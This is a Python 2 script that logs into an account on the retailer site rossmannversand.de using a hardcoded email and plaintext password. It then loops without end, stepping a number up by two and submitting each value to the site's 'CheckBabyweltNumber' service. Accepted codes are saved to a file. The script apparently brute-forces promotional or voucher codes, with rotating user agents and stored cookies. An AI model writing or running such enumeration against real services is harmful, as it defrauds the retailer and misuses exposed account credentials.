# coding=utf-8
from concurrent import futures
import datetime
import time
import requests
from lxml import html
import urllib,urllib2,httplib,cookielib,os,sys
from bs4 import BeautifulSoup
import lxml.html
import socket, traceback
import random
import linecache
import base64
from pyDes import *
from xml.dom.minidom import parse, parseString
from socket import *
import re
import json

def get_page(opener,url,data={},referer={},ua={}):
        if referer:
                headers = {'User-Agent': 'Opera/9.23 (Windows NT 5.1; U; zh-cn)',
                        'Referer': referer,
			'Host': 'www.rossmannversand.de',
			'Content-Length': '32',
			'Content-Type': 'application/json; charset=UTF-8'
                }
        else:
                headers = {'User-Agent': 'Opera/9.23 (Windows NT 5.1; U; zh-cn)', 
			'Host': 'www.rossmannversand.de'
		}
	#postdata = urllib.quote(data)
        postdata = data
	print headers
        print postdata
        if postdata:
                request=urllib2.Request(url,postdata,headers=headers)
        else:
                request=urllib2.Request(url,headers=headers)
        f = opener.open(request)
        content = f.read()
        return content

def get_page1(opener,url,data={},referer={},ua={}):
        if referer:
                headers = {'Host': 'www.rossmannversand.de',
			'User-Agent': 'Opera/9.23 (Windows NT 5.1; U; zh-cn)',
			'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryIWh7BuzSwzNBT1ev',
			#'Content-Length': '3741',
			'Referer': 'https://www.rossmannversand.de/DesktopModules/Webshop/shopcustadminlogin.aspx'

                }
        else:
                headers = {'User-Agent': ua,
                        'Host': 'www.rossmannversand.de'
                }
        #postdata = urllib.quote(data)
        postdata = data
        print headers
        print postdata
        if postdata:
                request=urllib2.Request(url,postdata,headers=headers)
        else:
                request=urllib2.Request(url,headers=headers)
        f = opener.open(request)
        content = f.read()
        return content

a = random.randrange(1, 9173)
ua = linecache.getline(r'ua_list.txt', a)
url = 'https://www.rossmannversand.de/DesktopModules/Webshop/shopcustadminlogin.aspx'

VIEWSTATE_SELECTOR = '//div/input[@name="__VIEWSTATE"]/@value'
VIEWSTATEGENERATOR_SELECTOR = '//div/input[@name="__VIEWSTATEGENERATOR"]/@value'
searchField = '//div/input[@name="ctl00$ctl01$SearchBoxTop$searchField"]/@value'

filename = 'cookie.txt'
cookiejar=cookielib.MozillaCookieJar(filename)
file = open(filename)
cookielines = file.readlines(100)
if cookielines:
	cookiejar.load('cookie.txt', ignore_discard=True, ignore_expires=True)
else:
	print("NULL COOKIE")
	cookiejar=cookielib.MozillaCookieJar(filename)
cj=urllib2.HTTPCookieProcessor(cookiejar)
opener=urllib2.build_opener(cj)
price = get_page(opener,url,"","",ua)
tree = html.fromstring(price)

view = tree.xpath(VIEWSTATE_SELECTOR)[0]
stat = tree.xpath(VIEWSTATEGENERATOR_SELECTOR)[0]
ct01_stat = tree.xpath(searchField)[0]

check_mail = 'https://www.rossmannversand.de/WebService/MailCheck.asmx/CheckMailLogin'
mail = '{"mail": "XCLHBPNH@outlook.com"}'
mail_referer = 'https://www.rossmannversand.de/DesktopModules/Webshop/shopcustadminlogin.aspx'
check_mail_data = get_page(opener,check_mail,mail,mail_referer,ua)
print check_mail_data

data = '------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="ctl00_ScriptManager1_HiddenField"\r\n\r\n\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="__EVENTTARGET"\r\n\r\nctl00$Main$btLogin\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="__EVENTARGUMENT"\r\n\r\n\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="__VIEWSTATE"\r\n\r\n' + view + '\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="__VIEWSTATEGENERATOR"\r\n\r\n' + stat + '\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="ctl00$ctl01$SearchBoxTop$searchField"\r\n\r\n' + ct01_stat + '\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="ctl00$Main$hp"\r\n\r\n\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="ctl00$Main$dfEmailOrKndnr$box"\r\n\r\nXCLHBPNH@outlook.com\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev\r\nContent-Disposition: form-data; name="ctl00$Main$dfLoginPasswort$box"\r\n\r\n564549024Zmm\r\n------WebKitFormBoundaryIWh7BuzSwzNBT1ev--\r\n'
login_url = 'https://www.rossmannversand.de/DesktopModules/Webshop/shopcustadminlogin.aspx'
login_page = get_page1(opener,login_url,data,mail_referer,ua)

#check_95 = 'http://www.rossmannversand.de/site/rightmenu=0/1330/babywelt.aspx'
#check_95_data = get_page(opener,check_95,"","",ua)
code_95_init = int(sys.argv[1])
while True:
	code_95_init = code_95_init + 2 
	delete_95 = 'http://www.rossmannversand.de/WebService/MailCheck.asmx/CheckBabyweltNumber'
	code_95 = '{"ef":"' + str(code_95_init) + '"}'
	headers = {'User-Agent': 'Opera/9.23 (Windows NT 5.1; U; zh-cn)',
		'Referer': 'http://www.rossmannversand.de/site/rightmenu=0/1330/babywelt.aspx',
		'Host': 'www.rossmannversand.de',
		'Content-Length': '17',
		'Content-Type': 'application/json; charset=UTF-8'
		}
	request=urllib2.Request(delete_95,code_95,headers=headers)
	f = opener.open(request)
	content = f.read()
	cmdjson = json.loads(content)
	cmd = cmdjson["d"]
	print code_95_init,";",cmd
	if cmd == '1':
		print code_95_init,"	","OK"
		datapath = '95_OK'
                if os.path.exists(datapath):
                        print "File ok"
                else:
                        os.mknod(datapath)
                local2 = open(datapath, 'a+')
                local2.write(str(code_95_init))
                local2.write('\n')
                local2.close()
	elif cmd == '2':
		print code_95_init,"	","USED"
	else:
		print code_95_init,"	","FUCK"

